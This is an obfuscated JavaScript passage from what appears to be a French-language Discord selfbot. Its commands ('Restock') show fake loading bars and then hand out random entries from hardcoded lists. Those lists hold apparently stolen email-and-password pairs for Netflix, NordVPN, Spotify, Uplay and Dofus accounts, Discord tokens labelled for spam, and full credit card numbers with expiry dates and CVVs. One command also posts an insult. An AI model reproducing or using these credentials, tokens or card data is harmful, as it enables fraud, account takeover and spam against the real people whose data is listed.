_0x53d860=_0x8a5b4f;_0x4418aa[_0x53d860(0x26f)]('>>>\x20Restock\x20\x20en\x20cours\x20\x0a\x20**Chargement.**\x20\x0a\x20▓░░░░░░░░░░░░░░░░░░░░░░░░\x204%'),_0x4418aa['edit']('>>>\x20Restock\x20\x20en\x20cours\x20\x0a\x20**Chargement...**\x20\x0a\x20▓▓▓░░░░░░░░░░░░░░░░░░░░░░\x2012%'),_0x4418aa[_0x53d860(0x26f)](_0x53d860(0x20f)),_0x4418aa[_0x53d860(0x26f)](_0x53d860(0x611)),_0x4418aa[_0x53d860(0x26f)]('>>>\x20Restock\x20\x20en\x20cours\x20\x0a\x20**Chargement..**\x20\x0a\x20▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░\x2044%'),_0x4418aa[_0x53d860(0x26f)](_0x53d860(0x561)),_0x4418aa['edit'](_0x53d860(0x3bf)),_0x4418aa['edit'](_0x53d860(0x2a3)),_0x4418aa[_0x53d860(0x26f)](_0x53d860(0x266));var _0x1fdb2e=Math[_0x53d860(0x49c)](Math[_0x53d860(0x4ca)]()*_0x3082df['length']);_0x4418aa['edit']('>>>\x20***Voila\x20ton\x20compte\x20netflix\x20:\x20***'+_0x3082df[_0x1fdb2e]);})):_0x35b0b3['edit'](nowhite));_0x35b0b3[_0x8a5b4f(0x4c7)]===prefix+_0x8a5b4f(0x32a)&&(_0x35b0b3[_0x8a5b4f(0x42b)]['id']===client[_0x8a5b4f(0x377)]['id']?(console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x3e1)),_0x35b0b3['delete'](),_0x35b0b3[_0x8a5b4f(0x396)][_0x8a5b4f(0x678)]('>>>\x20Restock\x20de\x20nordvpn\x20en\x20cours..')[_0x8a5b4f(0x1d9)](_0x1c47e4=>{const _0x221536=_0x8a5b4f;_0x1c47e4['edit'](_0x221536(0x530)),_0x1c47e4[_0x221536(0x26f)]('>>>\x20Restock\x20\x20en\x20cours\x20\x0a\x20**Chargement...**\x20\x0a\x20▓▓▓░░░░░░░░░░░░░░░░░░░░░░\x2012%'),_0x1c47e4[_0x221536(0x26f)](_0x221536(0x20f)),_0x1c47e4['edit'](_0x221536(0x611)),_0x1c47e4['edit'](_0x221536(0x23b)),_0x1c47e4[_0x221536(0x26f)](_0x221536(0x561)),_0x1c47e4[_0x221536(0x26f)]('>>>\x20Restock\x20\x20en\x20cours\x20\x0a\x20**Chargement...**\x20\x0a\x20▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░\x2072%'),_0x1c47e4[_0x221536(0x26f)](_0x221536(0x2a3)),_0x1c47e4[_0x221536(0x26f)]('>>>\x20Restock\x20\x20en\x20cours\x20\x0a\x20**Chargement.**\x20\x0a\x20▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓100%\x20');var _0x52690a=Math[_0x221536(0x49c)](Math[_0x221536(0x4ca)]()*_0x3d2fe3[_0x221536(0x3f6)]);_0x1c47e4[_0x221536(0x26f)]('>>>\x20***Voila\x20ton\x20compte\x20nord\x20vpn\x20:\x20***'+_0x59c388[_0x52690a]);})):_0x35b0b3[_0x8a5b4f(0x26f)](nowhite));_0x35b0b3['content']===prefix+_0x8a5b4f(0x5c1)&&(_0x35b0b3[_0x8a5b4f(0x42b)]['id']===client[_0x8a5b4f(0x377)]['id']?(console['log'](_0x8a5b4f(0x340)),_0x35b0b3['delete'](),_0x35b0b3[_0x8a5b4f(0x396)][_0x8a5b4f(0x678)](_0x8a5b4f(0x48f))[_0x8a5b4f(0x1d9)](_0x1526b5=>{const _0x6e14ad=_0x8a5b4f;_0x1526b5[_0x6e14ad(0x26f)](_0x6e14ad(0x530)),_0x1526b5[_0x6e14ad(0x26f)](_0x6e14ad(0x3ee)),_0x1526b5[_0x6e14ad(0x26f)]('>>>\x20Restock\x20\x20en\x20cours\x20\x0a\x20**Chargement.**\x20\x0a\x20▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░\x2028%'),_0x1526b5[_0x6e14ad(0x26f)](_0x6e14ad(0x23b)),_0x1526b5[_0x6e14ad(0x26f)](_0x6e14ad(0x561)),_0x1526b5['edit']('>>>\x20Restock\x20\x20en\x20cours\x20\x0a\x20**Chargement...**\x20\x0a\x20▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░\x2079%'),_0x1526b5[_0x6e14ad(0x26f)]('>>>\x20Restock\x20\x20en\x20cours\x20\x0a\x20**Chargement..**\x20\x0a\x20▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░\x2092%'),_0x1526b5['edit'](_0x6e14ad(0x266));var _0x11ca14=Math[_0x6e14ad(0x49c)](Math[_0x6e14ad(0x4ca)]()*_0x5ba9a8[_0x6e14ad(0x3f6)]);_0x1526b5[_0x6e14ad(0x26f)]('>>>\x20***Voila\x20ton\x20token\x20pour\x20spam\x20:***\x20'+_0x5ba9a8[_0x11ca14]);})):_0x35b0b3[_0x8a5b4f(0x26f)](nowhite));_0x35b0b3['content']===prefix+_0x8a5b4f(0x4f1)&&(_0x35b0b3['author']['id']===client['user']['id']?(console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x505)),_0x35b0b3[_0x8a5b4f(0x246)](),_0x35b0b3[_0x8a5b4f(0x396)][_0x8a5b4f(0x678)](_0x8a5b4f(0x59e))[_0x8a5b4f(0x1d9)](_0x4463bf=>{const _0x2de1db=_0x8a5b4f;_0x4463bf[_0x2de1db(0x26f)](_0x2de1db(0x530)),_0x4463bf['edit'](_0x2de1db(0x3ee)),_0x4463bf['edit'](_0x2de1db(0x611)),_0x4463bf[_0x2de1db(0x26f)]('>>>\x20Restock\x20\x20en\x20cours\x20\x0a\x20**Chargement..**\x20\x0a\x20▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░\x2044%'),_0x4463bf[_0x2de1db(0x26f)](_0x2de1db(0x561)),_0x4463bf[_0x2de1db(0x26f)](_0x2de1db(0x3bf)),_0x4463bf[_0x2de1db(0x26f)](_0x2de1db(0x2a3)),_0x4463bf[_0x2de1db(0x26f)]('>>>\x20Restock\x20\x20en\x20cours\x20\x0a\x20**Chargement.**\x20\x0a\x20▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓100%\x20'),_0x4463bf[_0x2de1db(0x26f)](_0x2de1db(0x251));var _0x1cec61=Math[_0x2de1db(0x49c)](Math[_0x2de1db(0x4ca)]()*_0x3bca54['length']);_0x4463bf[_0x2de1db(0x26f)](_0x2de1db(0x3d0)+_0x3bca54[_0x1cec61]);})):_0x35b0b3[_0x8a5b4f(0x26f)](nowhite));_0x35b0b3['content']===prefix+_0x8a5b4f(0x4a5)&&(_0x35b0b3[_0x8a5b4f(0x42b)]['id']===client['user']['id']?(console[_0x8a5b4f(0x32b)]('(Commande\x20:\x20{/gspotify}\x20Effectuer)\x20\x0a\x20================'),_0x35b0b3[_0x8a5b4f(0x246)](),_0x35b0b3[_0x8a5b4f(0x396)][_0x8a5b4f(0x678)](_0x8a5b4f(0x59e))['then'](_0x1e69e1=>{const _0x4f6e33=_0x8a5b4f;_0x1e69e1[_0x4f6e33(0x26f)]('>>>\x20Restock\x20\x20en\x20cours\x20\x0a\x20**Chargement.**\x20\x0a\x20▓░░░░░░░░░░░░░░░░░░░░░░░░\x204%'),_0x1e69e1[_0x4f6e33(0x26f)](_0x4f6e33(0x3ee)),_0x1e69e1['edit'](_0x4f6e33(0x611)),_0x1e69e1['edit']('>>>\x20Restock\x20\x20en\x20cours\x20\x0a\x20**Chargement..**\x20\x0a\x20▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░\x2044%'),_0x1e69e1[_0x4f6e33(0x26f)]('>>>\x20Restock\x20\x20en\x20cours\x20\x0a\x20**Chargement.**\x20\x0a\x20▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░\x2064%'),_0x1e69e1[_0x4f6e33(0x26f)](_0x4f6e33(0x3bf)),_0x1e69e1['edit'](_0x4f6e33(0x2a3)),_0x1e69e1[_0x4f6e33(0x26f)]('>>>\x20Restock\x20\x20en\x20cours\x20\x0a\x20**Chargement.**\x20\x0a\x20▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓100%\x20');var _0x35018d=Math[_0x4f6e33(0x49c)](Math['random']()*_0x47c8c1[_0x4f6e33(0x3f6)]);_0x1e69e1[_0x4f6e33(0x26f)](_0x4f6e33(0x27e)+_0x47c8c1[_0x35018d]);})):_0x35b0b3[_0x8a5b4f(0x26f)](nowhite));_0x35b0b3[_0x8a5b4f(0x4c7)]===prefix+_0x8a5b4f(0x22a)&&(_0x35b0b3[_0x8a5b4f(0x42b)]['id']===client['user']['id']?(console[_0x8a5b4f(0x32b)]('(Commande\x20:\x20{/Uplay}\x20Effectuer)\x20\x0a\x20================'),_0x35b0b3[_0x8a5b4f(0x246)](),_0x35b0b3[_0x8a5b4f(0x396)][_0x8a5b4f(0x678)](_0x8a5b4f(0x4cc))[_0x8a5b4f(0x1d9)](_0x396c71=>{const _0x181346=_0x8a5b4f;_0x396c71[_0x181346(0x26f)](_0x181346(0x530)),_0x396c71[_0x181346(0x26f)](_0x181346(0x3ee)),_0x396c71['edit'](_0x181346(0x611)),_0x396c71[_0x181346(0x26f)](_0x181346(0x23b)),_0x396c71[_0x181346(0x26f)](_0x181346(0x561)),_0x396c71[_0x181346(0x26f)](_0x181346(0x3bf)),_0x396c71[_0x181346(0x26f)](_0x181346(0x2a3)),_0x396c71['edit'](_0x181346(0x266));var _0x412c55=Math[_0x181346(0x49c)](Math[_0x181346(0x4ca)]()*_0x318d12[_0x181346(0x3f6)]);_0x396c71[_0x181346(0x26f)](_0x181346(0x495)+_0x318d12[_0x412c55]);})):_0x35b0b3['edit'](nowhite));if(_0x35b0b3['content'][_0x8a5b4f(0x57d)](prefix+_0x8a5b4f(0x472))){if(_0x35b0b3[_0x8a5b4f(0x42b)]['id']===client[_0x8a5b4f(0x377)]['id']){if(_0x35b0b3['deletable'])_0x35b0b3[_0x8a5b4f(0x246)]();var _0x4e08c8=new Discord[(_0x8a5b4f(0x2e8))]()[_0x8a5b4f(0x4ea)]('\x20**jvétniker\x20fdp\x20comme\x20lui\x20:\x20**')[_0x8a5b4f(0x6e4)]('')[_0x8a5b4f(0x6ae)](_0x8a5b4f(0x429))[_0x8a5b4f(0x39b)](color)[_0x8a5b4f(0x248)](_0x8a5b4f(0x6da),_0x35b0b3['author'][_0x8a5b4f(0x355)]);_0x35b0b3[_0x8a5b4f(0x396)]['sendEmbed'](_0x4e08c8);}}var _0x318d12=['triputra95@gmail.com:1987684123w\x20Units\x20=\x200\x20Level\x20=\x206\x20Tier\x20=\x20Blue\x20Club\x20Member\x20=\x20False\x20Games\x20=\x20[assassins-creed-III]',_0x8a5b4f(0x510),_0x8a5b4f(0x6c9),_0x8a5b4f(0x404),_0x8a5b4f(0x306),'syljon2@gmail.com:siwiec1995\x20Units\x20=\x2040\x20\x20Level\x20=\x208\x20Tier\x20=\x20Blue\x20Club\x20Member\x20=\x20False\x20Games\x20=\x20[,\x20rocksmith-2014-edition]\x20\x20Platforms\x20=\x20[ANDROID,\x20PC]',_0x8a5b4f(0x3fe),_0x8a5b4f(0x58b),_0x8a5b4f(0x5f2),_0x8a5b4f(0x406),_0x8a5b4f(0x627),'ben.b.boyce@gmail.com:guinness\x20Units\x20=\x2015\x20\x20Level\x20=\x206\x20Tier\x20=\x20Blue\x20Club\x20Member\x20=\x20False\x20Games\x20=\x20[tom-clancy-the-division]\x20Platforms\x20=\x20[XONE',_0x8a5b4f(0x3a0),_0x8a5b4f(0x579),'steven.dvorak88@gmail.com:Sd9807618\x20\x20Units\x20=\x200\x20Level\x20=\x204\x20Tier\x20=\x20Blue\x20Club\x20Member\x20=\x20False\x20Games\x20=\x20[ghost-recon-future-soldier]\x20\x20Platforms\x20=',_0x8a5b4f(0x5b2),_0x8a5b4f(0x65f),_0x8a5b4f(0x491),_0x8a5b4f(0x550),_0x8a5b4f(0x59c),_0x8a5b4f(0x562),_0x8a5b4f(0x5da),_0x8a5b4f(0x422),_0x8a5b4f(0x338),_0x8a5b4f(0x4bf),'isiaheholmes@gmail.com:Killer12',_0x8a5b4f(0x341),_0x8a5b4f(0x5c4),_0x8a5b4f(0x3bb),_0x8a5b4f(0x2cf),_0x8a5b4f(0x206),_0x8a5b4f(0x1fb),_0x8a5b4f(0x218),_0x8a5b4f(0x20e),_0x8a5b4f(0x6c3),_0x8a5b4f(0x6bf),'fyrstenborg@hotmail.com:Hppsc2175','kombat2431@gmail.com:Komputer2','cockeram@msn.com:Blunty238',_0x8a5b4f(0x31d),'davidaguilar891@yahoo.com:Panther12',_0x8a5b4f(0x24b),'roman.rinaldi@hotmail.com:Lolilo12','lawrencemayfield@hotmail.com:Tekken12',_0x8a5b4f(0x592),_0x8a5b4f(0x3b5),_0x8a5b4f(0x697),_0x8a5b4f(0x343),'jjf.joseph@gmail.com:Marmite2543',_0x8a5b4f(0x5f7),_0x8a5b4f(0x258),_0x8a5b4f(0x698),_0x8a5b4f(0x6bc),_0x8a5b4f(0x4d4),_0x8a5b4f(0x4aa),'castle_tee@yahoo.com.au:Kuykay123',_0x8a5b4f(0x6e2),_0x8a5b4f(0x453),_0x8a5b4f(0x3fc),'huntg78@gmail.com:Havefun77',_0x8a5b4f(0x22c),_0x8a5b4f(0x6d9)];const _0x3d2fe3=[_0x8a5b4f(0x61d),'5491846063156450|02|2025|940',_0x8a5b4f(0x574),_0x8a5b4f(0x51e),'5491846270263560|12|2025|707',_0x8a5b4f(0x5c3),_0x8a5b4f(0x31b),'5491840865383578|11|2026|377',_0x8a5b4f(0x326),_0x8a5b4f(0x439),_0x8a5b4f(0x27b),_0x8a5b4f(0x2b8),'5491841341015263|10|2025|912','5491843587114685|10|2024|796','5491843376135305|09|2023|391','5491842146388707|05|2024|474',_0x8a5b4f(0x2ae),'5491845158460835|06|2025|265',_0x8a5b4f(0x395),_0x8a5b4f(0x5d6),'5491848508470355|03|2022|141',_0x8a5b4f(0x58d),_0x8a5b4f(0x3e4),'5491845073713300|06|2023|902',_0x8a5b4f(0x584),_0x8a5b4f(0x4ce),'5491841673334175|05|2025|620',_0x8a5b4f(0x3d8),_0x8a5b4f(0x36b),_0x8a5b4f(0x666),_0x8a5b4f(0x462),_0x8a5b4f(0x4c8),_0x8a5b4f(0x464),'5491843528860164|01|2023|399',_0x8a5b4f(0x3ea),'5491846136786267|04|2025|525',_0x8a5b4f(0x2c3),_0x8a5b4f(0x314),_0x8a5b4f(0x356),_0x8a5b4f(0x44a),_0x8a5b4f(0x370)];var _0x47c8c1=['zurobski@optusnet.com.au:\x20Natsar77',_0x8a5b4f(0x1d5),_0x8a5b4f(0x69e),'mzerzghi@charter.net:\x20Eden1018',_0x8a5b4f(0x4b7),_0x8a5b4f(0x1e4),_0x8a5b4f(0x672),_0x8a5b4f(0x45c),_0x8a5b4f(0x3e9),'magixredux@gmail.com:screamo07',_0x8a5b4f(0x44c),_0x8a5b4f(0x62a),_0x8a5b4f(0x1d3),'bigbabymin@gmail.com:lmp,33food1',_0x8a5b4f(0x25c),'kyle_cifelli@yahoo.com:Duskborn1',_0x8a5b4f(0x4fd),'missshannon02@gmail.com:diamonds03\x20|\x20Subscription:\x20Spotify\x20Free\x20|\x20US\x20|\x20',_0x8a5b4f(0x6a3),_0x8a5b4f(0x638),'cofran26@hotmail.com:popollo00\x20|\x20Subscription:\x20Spotify\x20Free\x20|\x20AR\x20|\x20',_0x8a5b4f(0x205),'julianaa02@aol.com:JulianaA02\x20|\x20Subscription:\x20Spotify\x20Free\x20|\x20US\x20|\x20',_0x8a5b4f(0x4c6),_0x8a5b4f(0x327),_0x8a5b4f(0x3ec),'tflip08@gmail.com:bolts619\x20|\x20Subscription:\x20Spotify\x20Free\x20|\x20US\x20|\x20',_0x8a5b4f(0x6b7),'jacqueline.lundsted@ksc.keene.edu:bunny1207\x20|\x20Subscription:\x20Spotify\x20Free\x20|\x20US\x20|\x20',_0x8a5b4f(0x1e2),'marycameli@cox.net:\x20Hubby123',_0x8a5b4f(0x4bd),_0x8a5b4f(0x6cb),_0x8a5b4f(0x5ee),'bert.geukens@telenet.be:\x20bert2412',_0x8a5b4f(0x5c5),_0x8a5b4f(0x54d),_0x8a5b4f(0x394),_0x8a5b4f(0x3e3),'jorisdeblieck@telenet.be:\x201x1x1x',_0x8a5b4f(0x225),'phie95@web.de:\x20phie030795','barbara.quintelier@pandora.be:\x20bquint0',_0x8a5b4f(0x5b4),'valentin.jany@freenet.de:\x20w1a2l3l4y5','vera.de.belder@telenet.be:\x20Vera6780',_0x8a5b4f(0x2f7),_0x8a5b4f(0x4df),_0x8a5b4f(0x626),_0x8a5b4f(0x3ff),_0x8a5b4f(0x2d0),'josi_olga@uol.com.br:\x20josi8602',_0x8a5b4f(0x203)],_0x3bca54=[_0x8a5b4f(0x4fc),_0x8a5b4f(0x6ab),_0x8a5b4f(0x5cf),_0x8a5b4f(0x427),'hier631:Cireblanco7\x20|\x20SHIELD\x20=\x20False\x20|\x20Nombre\x20de\x20Goultines\x20=\x200\x20|\x20Nombre\x20d\x27Ogrines\x20=\x200\x20|\x20Nombre\x20de\x20Kroz\x20=\x200\x20|\x20Personnage\x20=\x20[]\x20|\x20Nombre\x20de\x20Kamas\x20=\x20[Atcham\x20=\x20226]\x20|\x20Kamas\x20en\x20attente\x20=\x20[0]\x20|\x20Abonné\x20=\x20False',_0x8a5b4f(0x58f),'Ptiteange90:smirnoff2611\x20|\x20SHIELD\x20=\x20False\x20|\x20Nombre\x20de\x20Goultines\x20=\x200\x20|\x20Nombre\x20d\x27Ogrines\x20=\x200\x20|\x20Nombre\x20de\x20Kroz\x20=\x200\x20|\x20Personnage\x20=\x20[]\x20|\x20Nombre\x20de\x20Kamas\x20=\x20[Agride\x20=\x208,\x20Ush\x20=\x2023]\x20|\x20Kamas\x20en\x20attente\x20=\x20[0,\x200]\x20|\x20Abonné\x20=\x20False',_0x8a5b4f(0x536),'CHERPIAT:k5hnnehx\x20|\x20SHIELD\x20=\x20False\x20|\x20Nombre\x20de\x20Goultines\x20=\x200\x20|\x20Nombre\x20d\x27Ogrines\x20=\x200\x20|\x20Nombre\x20de\x20Kroz\x20=\x200\x20|\x20Personnage\x20=\x20[]\x20|\x20Nombre\x20de\x20Kamas\x20=\x20[Atcham\x20=\x207]\x20|\x20Kamas\x20en\x20attente\x20=\x20[0]\x20|\x20Abonné\x20=\x20False',_0x8a5b4f(0x3f5),_0x8a5b4f(0x21c),_0x8a5b4f(0x590),_0x8a5b4f(0x3ab),'Bashintor:Aimar1991\x20|\x20SHIELD\x20=\x20False\x20|\x20Nombre\x20de\x20Goultines\x20=\x200\x20|\x20Nombre\x20d\x27Ogrines\x20=\x200\x20|\x20Nombre\x20de\x20Kroz\x20=\x200\x20|\x20Personnage\x20=\x20[]\x20|\x20Nombre\x20de\x20Kamas\x20=\x20[Atcham\x20=\x20,\x20Rubilax\x20=\x201\x20038]\x20|\x20Kamas\x20en\x20attente\x20=\x20[0,\x200]\x20|\x20Abonné\x20=\x20False','shadowgeekou03:Gregdu03190\x20|\x20SHIELD\x20=\x20False\x20|\x20Nombre\x20de\x20Goultines\x20=\x200\x20|\x20Nombre\x20d\x27Ogrines\x20=\x200\x20|\x20Nombre\x20de\x20Kroz\x20=\x200\x20|\x20Personnage\x20=\x20[Steamer\x20-\x20Niv.\x2023\x20-\x20Meriana]\x20|\x20Nombre\x20de\x20Kamas\x20=\x20[Meriana\x20=\x20,\x20Nidas\x20=\x20]\x20|\x20Kamas\x20en\x20attente\x20=\x20[0,\x200]\x20|\x20Abonné\x20=\x20False',_0x8a5b4f(0x5aa),'Mumacus:mumacus669\x20|\x20SHIELD\x20=\x20False\x20|\x20Nombre\x20de\x20Goultines\x20=\x200\x20|\x20Nombre\x20d\x27Ogrines\x20=\x200\x20|\x20Nombre\x20de\x20Kroz\x20=\x200\x20|\x20Personnage\x20=\x20[]\x20|\x20Nombre\x20de\x20Kamas\x20=\x20[]\x20|\x20Kamas\x20en\x20attente\x20=\x20[]\x20|\x20Abonné\x20=\x20False',_0x8a5b4f(0x255),_0x8a5b4f(0x3b6),_0x8a5b4f(0x407),'latinanhim:bigtop12\x20|\x20SHIELD\x20=\x20False\x20|\x20Nombre\x20de\x20Goultines\x20=\x200\x20|\x20Nombre\x20d\x27Ogrines\x20=\x200\x20|\x20Nombre\x20de\x20Kroz\x20=\x200\x20|\x20Personnage\x20=\x20[]\x20|\x20Nombre\x20de\x20Kamas\x20=\x20[]\x20|\x20Kamas\x20en\x20attente\x20=\x20[]\x20|\x20Abonné\x20=\x20False',_0x8a5b4f(0x4e0),'loulourandy:spiderman\x20|\x20SHIELD\x20=\x20False\x20|\x20Nombre\x20de\x20Goultines\x20=\x200\x20|\x20Nombre\x20d\x27Ogrines\x20=\x200\x20|\x20Nombre\x20de\x20Kroz\x20=\x200\x20|\x20Personnage\x20=\x20[]\x20|\x20Nombre\x20de\x20Kamas\x20=\x20[Agride\x20=\x201\x20558]\x20|\x20Kamas\x20en\x20attente\x20=\x20[0]\x20|\x20Abonné\x20=\x20False','Moniagun:azerty23\x20|\x20SHIELD\x20=\x20False\x20|\x20Nombre\x20de\x20Goultines\x20=\x200\x20|\x20Nombre\x20d\x27Ogrines\x20=\x200\x20|\x20Nombre\x20de\x20Kroz\x20=\x200\x20|\x20Personnage\x20=\x20[]\x20|\x20Nombre\x20de\x20Kamas\x20=\x20[]\x20|\x20Kamas\x20en\x20attente\x20=\x20[]\x20|\x20Abonné\x20=\x20False',_0x8a5b4f(0x1f8),'connerdraggo:Clw12345\x20|\x20SHIELD\x20=\x20False\x20|\x20Nombre\x20de\x20Goultines\x20=\x200\x20|\x20Nombre\x20d\x27Ogrines\x20=\x200\x20|\x20Nombre\x20de\x20Kroz\x20=\x200\x20|\x20Personnage\x20=\x20[]\x20|\x20Nombre\x20de\x20Kamas\x20=\x20[]\x20|\x20Kamas\x20en\x20attente\x20=\x20[]\x20|\x20Abonné\x20=\x20False',_0x8a5b4f(0x28c),'anselmking:sol64pera\x20|\x20SHIELD\x20=\x20False\x20|\x20Nombre\x20de\x20Goultines\x20=\x200\x20|\x20Nombre\x20d\x27Ogrines\x20=\x200\x20|\x20Nombre\x20de\x20Kroz\x20=\x200\x20|\x20Personnage\x20=\x20[]\x20|\x20Nombre\x20de\x20Kamas\x20=\x20[]\x20|\x20Kamas\x20en\x20attente\x20=\x20[]\x20|\x20Abonné\x20=\x20False',_0x8a5b4f(0x545),_0x8a5b4f(0x4da),_0x8a5b4f(0x614),_0x8a5b4f(0x2be),_0x8a5b4f(0x4cd),_0x8a5b4f(0x4f4),'boefjuhnl:edwin777\x20|\x20SHIELD\x20=\x20False\x20|\x20Nombre\x20de\x20Goultines\x20=\x200\x20|\x20Nombre\x20d\x27Ogrines\x20=\x200\x20|\x20Nombre\x20de\x20Kroz\x20=\x200\x20|\x20Personnage\x20=\x20[Cra\x20-\x20Niv.\x2044\x20-\x20Echo,\x20Xelor\x20-\x20Niv.\x2029\x20-\x20Echo,\x20Iop\x20-\x20Niv.\x2053\x20-\x20Echo]\x20|\x20Nombre\x20de\x20Kamas\x20=\x20[Echo\x20=\x2044\x20943]\x20|\x20Kamas\x20en\x20attente\x20=\x20[0]\x20|\x20Abonné\x20=\x20False',_0x8a5b4f(0x4c1),'kaziz59:Nordin01\x20|\x20SHIELD\x20=\x20False\x20|\x20Nombre\x20de\x20Goultines\x20=\x200\x20|\x20Nombre\x20d\x27Ogrines\x20=\x200\x20|\x20Nombre\x20de\x20Kroz\x20=\x200\x20|\x20Personnage\x20=\x20[]\x20|\x20Nombre\x20de\x20Kamas\x20=\x20[Meriana\x20=\x204\x20608]\x20|\x20Kamas\x20en\x20attente\x20=\x20[0]\x20|\x20Abonné\x20=\x20False',_0x8a5b4f(0x663),_0x8a5b4f(0x24a),_0x8a5b4f(0x57c),'WiFGameR:Alessio21\x20|\x20SHIELD\x20=\x20False\x20|\x20Nombre\x20de\x20Goultines\x20=\x200\x20|\x20Nombre\x20d\x27Ogrines\x20=\x200\x20|\x20Nombre\x20de\x20Kroz\x20=\x200\x20|\x20Personnage\x20=\x20[]\x20|\x20Nombre\x20de\x20Kamas\x20=\x20[]\x20|\x20Kamas\x20en\x20attente\x20=\x20[]\x20|\x20Abonné\x20=\x20False'],_0x5ba9a8=[_0x8a5b4f(0x693),_0x8a5b4f(0x1db),_0x8a5b4f(0x5d4),_0x8a5b4f(0x244),'NzAzNzA4MDUxMjI3ODAzNjg4.XqShZw.jMqW0x62qRe9NcYtgLUcxh6QTnw',_0x8a5b4f(0x2ac),_0x8a5b4f(0x3c9),_0x8a5b4f(0x2b0),_0x8a5b4f(0x5a4)],_0x59c388=[_0x8a5b4f(0x303),'jadenb551@gmail.com:Pookie234\x20|\x20Expiration\x20=\x202020-06-08\x2020:19:21','He.francesco@gmail.com:Emily2014.\x20|\x20Expiration\x20=\x202022-06-19\x2016:50:44','alandalmau@icloud.com:Daymond0\x20|\x20Expiration\x20=\x202020-06-01\x2002:39:12','Lvisng95@gmail.com:Lvisng95\x20|\x20Expiration\x20=\x202020-06-03\x2018:49:28',_0x8a5b4f(0x519),_0x8a5b4f(0x6a7),'mrgriggs1987@gmail.com:stephen1992\x20|\x20Expiration\x20=\x202019-12-04\x2002:03:49',_0x8a5b4f(0x499),'kivanctarlan@gmail.com:9surgeon123\x20|\x20Expiration\x20=\x202022-02-09\x2020:01:33',_0x8a5b4f(0x428),_0x8a5b4f(0x29f),_0x8a5b4f(0x288),_0x8a5b4f(0x556),_0x8a5b4f(0x4e3),_0x8a5b4f(0x276),'cruzboy@me.com:Dbacks23\x20|\x20Expiration\x20=\x202019-08-30\x2005:03:15',_0x8a5b4f(0x662),_0x8a5b4f(0x602),'johnoliverwalters@gmail.com:Mamamia2\x20|\x20Expiration\x20=\x202019-10-18\x2010:22:39','ryan.augustino@gmail.com:skylin33x3\x20|\x20Expiration\x20=\x202020-09-12\x2004:55:28',_0x8a5b4f(0x2d6),_0x8a5b4f(0x688),_0x8a5b4f(0x21b),'moizesomething@hotmail.com:Liverpool12\x20|\x20Expiration\x20=\x202020-06-07\x2001:09:36',_0x8a5b4f(0x518),'jylcook@gmail.com:Clearout1\x20|\x20Expiration\x20=\x202019-09-24\x2006:44:01',_0x8a5b4f(0x5a5),_0x8a5b4f(0x567),_0x8a5b4f(0x2b9),_0x8a5b4f(0x5a2),_0x8a5b4f(0x34f),_0x8a5b4f(0x437),'chematorres2017@gmail.com:torres11\x20|\x20Expiration\x20=\x202020-03-13\x2000:29:20','1pardot@gmail.com:cubiche1\x20|\x20Expiration\x20=\x202022-03-23\x2000:50:02',_0x8a5b4f(0x2f0),_0x8a5b4f(0x64f),_0x8a5b4f(0x4bc),_0x8a5b4f(0x664),_0x8a5b4f(0x66e)],_0x3082df=[_0x8a5b4f(0x57e),'amynaomi2001@gmail.com:amy10151981','an.deskins@hotmail.com:cougar85',_0x8a5b4f(0x409),'victoriaschubert1402@gmail.com:klavier1402',_0x8a5b4f(0x457),_0x8a5b4f(0x68b),_0x8a5b4f(0x520),_0x8a5b4f(0x4c2),_0x8a5b4f(0x2b4),_0x8a5b4f(0x5c8),'caforummodi@gmail.com:Sunshine.24','maha.almarush@gmail.com:Mahawi84',_0x8a5b4f(0x6a2),'briannarodriguez_meza@yahoo.com:Bri081201',_0x8a5b4f(0x471),'Steve31215@gmail.com:Steve15312!','Jonboetefuer@gmail.com:Tigers2020','trmason2121@gmail.com:Heyward22',_0x8a5b4f(0x531)],_0x1ec018=[_0x8a5b4f(0x55e),_0x8a5b4f(0x352),_0x8a5b4f(0x3eb),'nameloc_s@hotmail.com:ipwnj00ezpka',_0x8a5b4f(0x43a),_0x8a5b4f(0x4e8),_0x8a5b4f(0x489),_0x8a5b4f(0x41b),_0x8a5b4f(0x5ea),_0x8a5b4f(0x4b9),_0x8a5b4f(0x50d),_0x8a5b4f(0x6c8),_0x8a5b4f(0x2ba),_0x8a5b4f(0x633),'pavelznachoda@seznam.cz:Brokolice98','se.mcguire87@gmail.com:rowland23',_0x8a5b4f(0x65b),'rin.revell@gmail.com:shinev133',_0x8a5b4f(0x31c),_0x8a5b4f(0x232),_0x8a5b4f(0x33a),_0x8a5b4f(0x1e0),_0x8a5b4f(0x56d),_0x8a5b4f(0x655),_0x8a5b4f(0x484),'blake120000@gmail.com:twiztid13','tarvusthegreat@gmail.com:Gr33nmile310',_0x8a5b4f(0x2ed),_0x8a5b4f(0x300),_0x8a5b4f(0x3e8),_0x8a5b4f(0x3c6),_0x8a5b4f(0x44e),_0x8a5b4f(0x5d3),_0x8a5b4f(0x21d),_0x8a5b4f(0x301),_0x8a5b4f(0x360),'nimirahb@gmail.com:bianca26','mikaelm2001@gmail.com:mikael01',_0x8a5b4f(0x6d4),'soulraver123456@gmail.com:Soulraver123',_0x8a5b4f(0x595),_0x8a5b4f(0x28f),'gengargrey@gmail.com:092598dlh',_0x8a5b4f(0x674),_0x8a5b4f(0x521),_0x8a5b4f(0x633),'speedzimba5@yahoo.com:Aa825607',_0x8a5b4f(0x2fa),_0x8a5b4f(0x2af),'halldor0gudmundsson@gmail.com:awesome123','quentin_laffez@hotmail.com:Cocacola91',_0x8a5b4f(0x470),_0x8a5b4f(0x60c),_0x8a5b4f(0x351),'calebharris50@gmail.com:Setzer321',_0x8a5b4f(0x331),'adrianpaul380@gmail.com:gummybear101','russelld.wolfe@yahoo.com:Airport1','yo_dig@hotmail.com:vincent513'];if(_